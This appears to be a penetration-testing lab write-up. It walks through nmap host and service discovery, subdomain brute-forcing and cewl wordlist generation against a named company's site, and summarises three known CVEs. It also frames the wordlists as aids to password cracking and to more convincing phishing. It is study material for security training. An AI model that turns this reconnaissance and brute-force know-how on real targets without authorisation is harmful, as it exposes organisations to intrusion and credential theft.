### HOST DISCOVERY
### Explanation
It refers to the process of identifying which hosts (computers or devices) are active and responsive on a network. When performing penetration testing, this is often the first step before proceeding with more detailed scans. Host discovery allows you to find out which systems are up and which are down, helping to narrow the focus for further analysis.

### Ping scan   
  - ***command = nmap -sn 10.10.10.0/24***
  
![alt text](<Screenshot from 2024-09-17 08-17-35.png>)


### Information gathering
1. Perform the host discovery again and save the output in a grepable format to a file.
   - *command = nmap -sn 10.10.10.0/24 | grep -i "nmap report for" | awk '{print $5}' > alive_hosts.txt*
  
  ![alt text](<Screenshot from 2024-09-17 08-25-56.png>)
   
2. Verify the contents of the new file by viewing it with the ***cat*** command.  
     - *command = cat alive_hosts.txt*
  
  ![alt text](<Screenshot from 2024-09-17 08-27-57.png>)
   
3. Perform a detailed scan on the discovered hosts for more information (host reconnaissance)
     - *command = nmap -p 1-100 -sV -iL live_hosts.txt -oN detailed_scan.txt*

### AIODNSBRUTE
It is a Python library that provides an asynchronous DNS brute-force attack tool. It allows you to efficiently enumerate subdomains of a target domain by attempting to resolve them using DNS queries.

**Command**  
sudo aiodnsbrute -w /usr/share/wordlists/oracle_default_passwords.txt

![alt text](<Screenshot from 2024-09-17 14-55-59.png>)
Three subdomains were found after bruteforcing the domain virtualinfosecafrica.  
    
  | Subdomain                      | Ip address     |
  | -----------                    | ------------   |
  | 1. ftp.virtualinfosecafrica.com   | 192.185.23.171 |
  | 2. whm.virtualinfosecafrica.com   | 192.185.23.171 |
  | 3. www.virtualinfosecafrica.com   | 192.185.23.171 |

##  SERVICE DISCOVERY and PORT SCANNING

**PORT SCANNING**  
    Helps identify which ports are open on a target system. Each port may represent a different service or application running on the server.    
   - *command = nmap --top-ports 100 10.10.10.0*
  
  ![alt text](<Screenshot from 2024-09-17 08-36-51.png>)

**SERVICE DISCOVERY**  
   Once open ports are identified, service discovery determines what services or applications are running on those ports. This can reveal information about the software versions and configurations.  
 -  *command = nmap -sV 10.10.10.0 -oG scan_results.gnmap*
  
 ![alt text](<Screenshot from 2024-09-17 08-38-00-1.png>)
  

**PURPOSE**  
|||
|:----------------| :---------------|
| Vulnerability Identification | Knowing which services are running and their versions can help identify vulnerabilities|
| Asset Inventory | Service discovery and port scanning help create a detailed inventory of networked devices and services.|
|Configuration Review| Ensures that services are configured according to best practices and compliance requirements.|
|Detect Unauthorized Services|Port scanning can reveal unauthorized or unexpected services running on the network, which could indicate a breach or misconfiguration.|
|Resource Utilization| Identifying services and their associated ports helps in understanding resource utilization and optimizing network performance.|
|Capacity Planning| Helps in planning for capacity and scaling by understanding the load and demands on different services.|


**PROTOCOLS IN SERVICE DISCOVERY**  

1. Service scan: nmap -sV 10.10.10.0/24 -oG scan_results.gnmap
   
2. Grep TCP protocol: grep '/tcp' scan_results.gnmap > tcp_ports.txt
   
3.  Grep UDP protocol: grep '/udp' scan_results.gnmap > udp_ports.txt
   
4. View results in the grepped files: 
   - cat tcp_ports.txt
  
   - cat udp_ports.txt
5. Print specific columns:
   - awk '/ \ /tcp/ {print $2, $4}' scan_results.gnmap > tcp_ports_summary.txt
  
   - awk '/ \ /udp/ {print $2, $4}' scan_results.gnmap > udp_ports_summary.txt

*NOTE:*   
The services (https, http, vnc, telnet, mysql, rdp,smtp, ssl,netbios-ssn and microsoft-ds) were all grouped under the tcp ports.

## MITRE CVE DATABASE 

### Apache Limitation: Incomplete fix of CVE-2021-41773 

**Description**  
It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

### Limitation: Elevation of Privilege 

**Description**  
A vulnerability exists in **Microsoft Windows when Folder Redirection** is enabled via Group Policy, particularly when the folder redirection file server is co-located with a Terminal Server. An attacker could exploit this vulnerability by creating a new folder under the Folder Redirection root path and setting up a junction. When a new user logs in, the system redirects their personal data to this malicious folder, allowing the attacker to gain unauthorized access to sensitive files. This issue requires reconfiguring Folder Redirection and setting strict permissions, as it cannot be fixed with a security update.

### SMTP Smuggling

**Description**  
In Exim versions prior to 4.97.1, there is a vulnerability related to SMTP smuggling in specific PIPELINING/CHUNKING configurations. This issue arises because Exim accepts a certain character sequence (<LF>.<CR><LF>), which some other email servers do not. Attackers can exploit this vulnerability to inject emails with spoofed sender addresses, thereby bypassing the Sender Policy Framework (SPF) protection that prevents email spoofing. The vulnerability can allow unauthorized mail to be accepted and delivered by vulnerable mail servers.

## Creating a Custom Wordlist Using Cewl

Cewl (Custom Word List generator) is a tool that extracts words from web pages to create a custom wordlist. This can be particularly useful in penetration testing and security assessments, where specific, target-related terms can significantly enhance the effectiveness of attacks such as password cracking or brute-force attacks.

***COMMAND: cewl -m 5 -w custom_passlists.txt --with-numbers -c -v https://www.virtualinfosecafrica.com***

![alt text](<Screenshot from 2024-09-17 15-21-20.png>)

## CUSTOM WORDLIST IMPORTANCE

**Password Cracking**  
* Target-Specific Attacks   
  When performing password cracking against a target's system or application, using a custom wordlist tailored to the target's context (e.g., company names, product names) can be more effective than generic wordlists.

* Brute-Force Attacks  
        
    Customized Attacks: For brute-forcingauthentication services (e.g., SSH, FTP), a custom wordlist that includes potential usernames and passwords specific to the target can yield better results.

**Social Engineering:**
* Phishing Campaigns  

  If you are conducting a social engineering attack, having a wordlist that includes names of employees, departments, or internal jargon can help craft more convincing phishing emails or messages.

**Security Assessments:**
* Penetration Testing  

   During penetration testing, generating a custom wordlist from a company's website can uncover security issues such as weak passwords or predictable patterns that are specific to the organization.

## WEB-BASED ATTACK SURFACES

**EyeWitness** is a tool used to automate the process of gathering information about web services by taking screenshots of websites, identifying default credentials, and providing quick access to web application metadata. It's particularly useful for penetration testers, security analysts, and researchers when assessing web applications across multiple hosts.

### Features
- **Screenshots**: Captures screenshots of websites, which helps in quickly reviewing exposed web services.
- **Web Application Scanning**: Focuses on web services and supports both HTTP and HTTPS.
- **Metadata Collection**: Gathers information such as HTTP headers and title pages to give insights into the services running.
- **Handling Non-Standard Ports**: EyeWitness can handle web servers running on non-standard ports, which is common in internal networks.
- **Report Generation**: Generates HTML-based reports that include the screenshots and metadata for easy review.
